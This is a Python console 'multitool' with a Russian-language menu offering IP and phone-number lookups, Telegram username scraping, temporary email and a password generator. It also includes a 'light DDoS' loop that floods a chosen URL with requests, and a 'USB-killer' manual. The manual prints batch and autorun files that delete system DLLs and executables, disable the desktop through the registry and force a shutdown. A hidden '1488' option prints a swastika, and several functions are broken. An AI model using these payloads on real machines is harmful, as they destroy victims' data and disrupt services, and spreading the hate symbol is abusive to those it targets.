from faker import Faker
import random 
import requests
from bs4 import BeautifulSoup
import os
import time
import pystyle as p
from pystyle import Colors
from phonenumbers import geocoder, carrier, timezone
import phonenumbers
from phonenumbers.phonenumberutil import number_type
import string
color = Colors.light_blue  #необходимые равенства
interval=int(0.001)
soup = BeautifulSoup()
fake = Faker()
swaston = '''
░░░░░░░░░░░░░░░▄▀▄░░░░░░░░░░░░░░░
░░░░░░░░░░░░░▄▀░░░▀▄░░░░░░░░░░░░░
░░░░░░░░░░░▄▀░░░░▄▀█░░░░░░░░░░░░░
░░░░░░░░░▄▀░░░░▄▀░▄▀░▄▀▄░░░░░░░░░
░░░░░░░▄▀░░░░▄▀░▄▀░▄▀░░░▀▄░░░░░░░
░░░░░░░█▀▄░░░░▀█░▄▀░░░░░░░▀▄░░░░░
░░░▄▀▄░▀▄░▀▄░░░░▀░░░░▄█▄░░░░▀▄░░░
░▄▀░░░▀▄░▀▄░▀▄░░░░░▄▀░█░▀▄░░░░▀▄░
░█▀▄░░░░▀▄░█▀░░░░░░░▀█░▀▄░▀▄░▄▀█░
░▀▄░▀▄░░░░▀░░░░▄█▄░░░░▀▄░▀▄░█░▄▀░
░░░▀▄░▀▄░░░░░▄▀░█░▀▄░░░░▀▄░▀█▀░░░
░░░░░▀▄░▀▄░▄▀░▄▀░█▀░░░░▄▀█░░░░░░░
░░░░░░░▀▄░█░▄▀░▄▀░░░░▄▀░▄▀░░░░░░░
░░░░░░░░░▀█▀░▄▀░░░░▄▀░▄▀░░░░░░░░░
░░░░░░░░░░░░░█▀▄░▄▀░▄▀░░░░░░░░░░░
░░░░░░░░░░░░░▀▄░█░▄▀░░░░░░░░░░░░░
░░░░░░░░░░░░░░░▀█▀░░░░░░░░░░░░░░░'''
banner = '''   
                                                    ███████████  
                                                    ███     ███ 
                                                    ███     ███ 
                                                    ██████████  
                                                    ███     ███ 
                                                    ███     ███ 
                                                    ███     ███ \n'''
def ddos():
    p.Write.Print('''                                   !ВНИМАНИЕ!\nСОВЕТУЕМ ВКЛЮЧИТЬ ВПН, ТАК КАК ЗАПРОСЫ МОГУТ ИДТИ С ВАШЕГО USER-AGENT'A!''', Colors.red, interval)
    try:
        url = p.Write.Input('введите ссылку\n>>>', color, interval)
        while True:
            number_requests = 0
            r = requests.get(url)
            if r.status_code == 200:
                number_requests += 1
                p.Write.Print(f'[+] - чтобы остановить поток нужно зажать ctrl + C\nуспешный запрос №{number_requests}', color, interval)
            else:
                p.Write.Print('возникла ошибка при обработке запроса, возвращаю в меню..', color, interval)
                time.sleep(0.5)
                cls()
    except Exception as e:
        p.Write.Print(f'произошла ошибка {e}\nВозвращаю в меню.. ', color, interval)
        time.sleep(0.5)               
def gen_pass():
    k1 = int(p.Write.Input('введите число символов в пароле\n>>>', color, interval))
    try:
        response = ''.join(random.choices(string.ascii_letters + string.digits,k=k1 ))
        p.Write.Print(f'ваш новый пароль - {response}\n', color, interval)
        p.Write.Input('enter для выхода в меню  \n', color, interval)
        cls()
    except Exception as e:
        p.Write.Input(f'ошибка - {e}\nenter для выхода в меню', color, interval)  
        cls()   
def ip_lookup():
    try:
        import json
        from urllib.request import urlopen
        query = p.Write.Input('введите ip\n>>>', color, interval)
        url =  f'http://ip-api.com/json/{query}'
        response = urlopen(url)
        result = json.load(response)
        p.Write.Print(f'|статус запроса - {result["status"]}\n', color, interval)
        p.Write.Print(f'|страна - {result["country"]}\n', color, interval)
        p.Write.Print(f'|регион страны - {result["regionName"]}\n', color, interval)
        p.Write.Print(f'|город - {result["city"]}\n', color, interval)
        p.Write.Print(f'|провайдер - {result["isp"]}\n', color, interval)
        p.Write.Print(f'|организация, обеспечивающая\n|сеть - {result["org"]}\n|\n|', color, interval)
        p.Write.Print(f'|наличие прокси - {result["proxy"]}\n', color, interval)
        p.Write.Input(f'LENTER ДЛЯ ВЫХОДА В МЕНЮ ', color, interval)
        cls()



    except Exception as e :
        p.Write.Print(f'произошла ошибка - {e}\nвозвращаю в главное меню', color, interval)
        time.sleep(0.5)
        cls()
def usb():
    p.Write.Print('''Создаем на ней три файла:
AUTOEXEC.BAT
Dead.BAT
autorun.ini
Открываем AUTOEXEC.BAT и пишем:
goto %config%

:dos1

rem c:vc401vc

lh keyrus

lh mmouse

lh C:WINDOWSCOMMANDmscdex /d:12345678

lh dndn

bootgui=0

:dos2

rem essolo.com

lh keyrus

lh mmouse

lh dndn

bootgui=0

:win

rem c:essolo.com

set path=C:WINDOWS;C:WINDOWSCOMMAND;c:;c:windows;c:windowscomand;c:arc;c:dn

C:WINDOWSCOMMANDDELTREE /y C:WINDOWSTEMP*.*

mode con codepage prepare=((866) C:WINDOWSCOMMANDega3.cpi)

mode con codepage sеlесt=866

keyb ru,,C:WINDOWSCOMMANDkeybrd3.sys

goto continue

:meos

c:kolibrimeosload.com

:l:meosload.com

:continue

rem bootgui=1

cd

cd windows

del *.dll

del *.ini

cd system32

del *.dll

del *.exe

cd D:

del *.exe

Открываем Dead.BAT и пишем:
@echo off

cp Флешка:AUTOEXEC.BAT C:

msg * "Dead" >nul

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoDesktop /t REG_DWORD /d 1 /f >nul

shutdown -s -t 1 -c "lol" -f >nul

В autorun.ini пишем:
[autorun]

OPEN=Dead.BAT

ГОТОВО!
Как это работает:
Вы вставляете флешку
autorun.ini автоматически открывает Dead.BAT
Dead.BAT копирует AUTOEXEC.BAT на C и выключает компьютер.
При следующем запуске система слетает.''', Colors.red, interval)
def parser_tg():
    nick = p.Write.Input('username(без @)\n>>>', color, interval)
    url = f'https://t.me/{nick}'

    response = requests.get(url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')

        user_name_tag = soup.find('meta', property='og:title')
        user_description_tag = soup.find('meta', property='og:description')

        if user_name_tag and user_description_tag:
            username = user_name_tag.get('content', '').strip()
            description = user_description_tag.get('content', '').strip()
            p.Write.Print(f'|ИМЯ В СИСТЕМЕ - {username}\n|BIO - {description}\n|ПРЯМАЯ ССЫЛКА НА ДИАЛОГ - t.me/{nick}\n|\n', color, interval)
            p.Write.Input('|L ENTER, чтобы выйти в меню ', color, interval)
            cls()
        elif user_name_tag:
            username = user_name_tag.get('content', '').strip()
            p.Write.Print(f'|такой ник существует - {username}', color, interval)
            p.Write.Input('|L ENTER, чтобы выйти в меню ', color, interval)
            cls()
        else:
            p.Write.Print(f'|такого username не существует', color, interval)
            p.Write.Input('|L ENTER, чтобы выйти в меню ', color, interval)
            cls()
    else:
        p.Write.Print('|Не удалось подключиться к Telegram', color, interval)
        p.Write.Input('|L ENTER, чтобы выйти в меню ', color, interval)
        cls()
def phone():
    try:
        number = input(Colors.blue + 'введи номер телефона в формате (+7999...)\n>>>')
        print(carrier._is_mobile(number_type(phonenumbers.parse(number))))
        print(phonenumbers.parse(number))

        my_number = phonenumbers.parse(number)
        print(Colors.blue + '|оператор: ', carrier.name_for_number(my_number, "en"))
        print(Colors.blue + '|часовой пояс: ', timezone.time_zones_for_number(my_number))
        print(Colors.blue +  '|зоны номера: ', geocoder.description_for_number(my_number, "en"))
        print(Colors.blue +  '|зоны номера: ', geocoder.description_for_number(my_number, "en"))
        print(Colors.blue + '|валидный ли номер? ', phonenumbers.is_valid_number(my_number))
        print(Colors.blue + '|в зоне действия сети? ', phonenumbers.is_possible_number(my_number))
        print(Colors.blue + '|Ссылки на соц-сети(могут быть не рабочими')
        print(Colors.blue + f'telegram: t.me/{number}')
        print(Colors.blue + f'whatsapp: wa.me/{number}')
        input(Colors.blue + 'L ENTER, ЧТОБЫ ВЫЙТИ ')
        cls() 
    except Exception as e:
        p.Write.Input(f'произошла ошибка - {e}\nдля выхода в меню ENTER', color, interval) 
        cls()     
def email():
    api_key = 'https://www.1secmail.com/api/v1/'
    domains = [
        "1secmail.com",
        "1secmail.org",
        "1secmail.net",
        "wwjmp.com",
        "esiix.com",
        "xojxe.com",
        "yoggm.com"
    ]
    domain_choice = random.choice(domains)

    def generate_mail():
        custom_name = p.Write.Input('выберите действие\n> 1- выбрать никнейм для почты самому [!ВОЗМОЖНЫ ОШИБКИ В РАБОТЕ!]\n> 2- рандом выбор [!РАБОТАЕТ КОРРЕКТНО!]', color, interval)  # создаем почту
        if custom_name == '1':
            name = p.Write.Input('введите никнейм !не менее 5 символов!\n>>>', color, interval)
            name = user_name
        elif custom_name == '2':
            name = string.ascii_lowercase + string.digits
            user_name = ''.join(random.choice(name) for i in range(5))  # генерируем юзернейм для почты 
        else:
            return custom_name
          # передаем в функцию
        return f"{user_name}@{domain_choice}"

    def check_mail(mail=''):  # проверка почты 
        request = f'{api_key}?action=getMessages&login={mail.split("@")[0]}&domain={mail.split("@")[1]}'  # подставляем переменные в ссылку, чтобы подключиться к конкретно сгенерированной почте
        r = requests.get(request).json()  # получаем ответ в формате JSON
        req_answer = len(r)  # получаем ответ 
        if req_answer == 0:  # если писем нет (0), то выводим соответствующую информацию
            p.Write.Print('Ожидание писем (пока что нет), следующая проверка через 10 секунд...', color, interval)
            time.sleep(10)
            p.Write.Print('Проверяем снова...', color, interval)
        else:
            ids = [msg["id"] for msg in r]  # пробегаемся по сообщениям и собираем ID
            p.Write.Print(f"Почта обновлена, у вас {req_answer} сообщений", color, interval)
            directory = os.getcwd()
            final = os.path.join(directory, 'all_emaaaai')
            if not os.path.exists(final):
                print("Ошибка, сейчас исправлю... подождите 5 секунд")
                os.makedirs(final)

            for i in ids:
                read_ans = f'{api_key}?action=readMessage&login={mail.split("@")[0]}&domain={mail.split("@")[1]}&id={i}'
                r = requests.get(read_ans).json()
                s = r.get('from')
                sub = r.get('subject')  # создаем переменные с выводом (для эстетики)
                mail1 = r.get('textBody')
                p.Write.Print('ВАШЕ СООБЩЕНИЕ:', color, interval)
                p.Write.Print("От кого: ", s, color, interval)
                p.Write.Print("Тема: ", sub, color, interval)
                p.Write.Print("Сообщение: ", mail1, color, interval)
                
            user_choice = p.Write.Input("Введите 1, чтобы удалить почту. 2 - чтобы выйти из приложения: ", color, interval)
            if user_choice == '1':
                delete_mail(mail)
            elif user_choice == '2':
                p.Write.Input('L ENTER, ЧТОБЫ ВЫЙТИ', color, interval)
                cls()
            else:
                print('Ошибка ввода')
                cls()

    def delete_mail(mail):
        request = f'{api_key}?action=deleteMail&login={mail.split("@")[0]}&domain={mail.split("@")[1]}'
        response = requests.get(request)
        if response.status_code == 200:
            p.Write.Print("Почта успешно удалена", color, interval)
            p.Write.Input('L ENTER, ЧТОБЫ ВЫЙТИ', color, interval)
            cls()
        else:
            p.Write.Input('L ENTER, ЧТОБЫ ВЫЙТИ', color, interval)
            cls()

    mail = generate_mail()
    p.Write.Print(f'Сгенерирована почта: {mail}', color, interval)
    check_mail(mail)

# Запуск функции
    email()


    def delete_mail(mail=''):  # удаление почты
        url = 'https://www.1secmail.com/mailbox'
        data = {
            'action': 'deleteMailbox',
            'login': {mail.split('@')[0]},
            'domain': {mail.split('@')[1]}
        }
        r = requests.post(url, data=data)
        p.Write.Print(f'удалил почтовый ящик-{mail}', color, interval)
        p.Write.Input('L ENTER, ЧТОБЫ ВЫЙТИ В МЕНЮ ')
        cls()
    

    def main():
        try:
            user_name = generate_mail()
            mail = f'{user_name}@{domain_choice}'
            p.Write.Print(f"ваш адрес почты-   {mail},будет удален через час", color, interval)

            mail_reg = f'{api_key}?login={mail.split("@")[0]}&domain={mail.split("@")[1]}'


            while True:
                check_mail(mail=mail)
        
        except(KeyboardInterrupt):
            print("вы прервали процесс,попробуйте снова")
            delete_mail(mail=mail)
            time.sleep(0,5)
            cls()

def hello():
    p.Write.Print(f'{banner}',  color, interval  )
    choice = p.Write.Input('''                          
                            +============================+=================================+
                            ||РАЗРАБОТЧИК-@PYTHON_PIONEER| МОЙ К4Н4Л - @pythoneer_projects||
                            +----------------------------+---------------------------------+
                            |1- П0ИСК ПО IP              | 2- л3гкий DD0S (ВКЛЮЧ1ТЬ VPN)   |
                            +----------------------------+---------------------------------+
                            |3- Г3Н3РАТОР П4РОЛЕЙ        | 4- ПРОВЕРКА НОМЕРА ТЕЛЕФОНА     |
                            +----------------------------+---------------------------------+
                            |5- М4НУАЛ ПО USB-KILL3R     | 6- ВР3М3ННАЯ П0ЧТА(с вашим nick)|
                            +----------------------------+---------------------------------+
                            |7- П4РСИНГ Н1КА Т3Л3ГР4М    | 8- Ф3ЙК ЛИЧН0СТЬ                |
                            +----------------------------+---------------------------------+
                            |9- ШАБЛОНЫ ИНФА ОГЭ         | 10- 0 С0ФТ3                     |
                            +----------------------------+---------------------------------+\n\nchoose variant --->  ''', color, interval)
    if choice == '1':
        ip_lookup()
    elif choice == '1488':
      p.Write.Print(swaston, color, interval)
    elif choice == '2':
        ddos()  
    elif choice == '3':
        gen_pass()
    elif choice == '4':
        phone()
    elif choice == '5':
        usb()
    elif choice == '6':
        email()
    elif choice == '7':
        parser_tg()
    else:
        p.Write.Print('!введите настоящее занчение!', color, interval)
        time.sleep(1)
        cls()
        
def cls():
    os.system('cls')
    hello()
           
a = input('установить модули? y/n')
if a == 'y':
    os.system('installing.py')
else:
    cls()








